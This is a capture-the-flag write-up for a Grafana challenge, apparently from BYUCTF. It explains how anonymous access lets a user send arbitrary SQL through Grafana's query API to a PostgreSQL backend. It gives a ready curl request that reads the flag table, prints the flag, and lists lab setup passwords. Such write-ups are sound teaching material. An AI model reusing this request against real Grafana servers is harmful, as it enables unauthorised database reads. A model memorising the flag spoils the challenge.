# Grafana
Level: Hard

Description:
```
I spun up a Grafana dashboard to list some sports statistics, but unfortunately it's broken and I'm tired so I'm just going to ignore it. I also heard that it may be [vulnerable if others can access it](https://community.grafana.com/t/dashboard-variable-sql-injection/11660), but there's no way a vulnerability like that is still in production software, so I'm not worried about it.

`http://byuctf.xyz:40010`
```

## Writeup
When access to Grafana is granted, the user controls the SQL queries sent to the server. In this case, anonymous access is granted to a Grafana server which is connected to a PostgreSQL database. Inspecting the Network tab will reveal a SQL query run in an HTTP request. By capturing that request and modifying the query run, the flag can be accessed from the `flag` table. An example command using cURL is below:

```bash
curl http://localhost:40010/api/ds/query -X POST --header 'Content-Type: application/json' -d '{"queries":[{"refId":"A","datasource":{"uid":"ctAhPmynz","type":"postgres"},"rawSql":"select * from flag;","format":"table","datasourceId":1,"intervalMs":30000,"maxDataPoints":716}],"range":{"from":"2022-03-25T01:09:57.542Z","to":"2022-03-25T07:09:57.542Z","raw":{"from":"now-6h","to":"now"}},"from":"1648170597542","to":"1648192197542"}'
```

**Flag** - `byuctf{qu3ry_1nj3ct10n_1s_4_"f34tur3"_1n_gr4f4n4}`

## Hosting
1. Spin up docker images
    - `sudo docker-compose rm -f && sudo docker-compose up -d`
2. Populate postgresql db
    - `psql -U postgres -h localhost < postgresql_build/sportsdb.sql` with password `tuiuiqxcugomqzxftelsmpfvbsjbkjre`
3. Setup Grafana
    - Sign in with username `admin` and password `miloxgxhcamdtsgmkjuaoqegwuywlyjq`
    - Add postgresql datasource
        - Host - `172.18.230.96:5432`
        - Database - `postgres`
        - User - `grafana_user`
        - Password - `nwfnqhzujqfagusdaahrdwlthhlwhwkf`
        - TLS/SSL Mode - `disable`
    - Add new dashboard "Broken Sports Dashboard"
        - Add new panel with raw query `select affiliation_type, count(affiliation_type) from affiliations group by affiliation_type`, format as table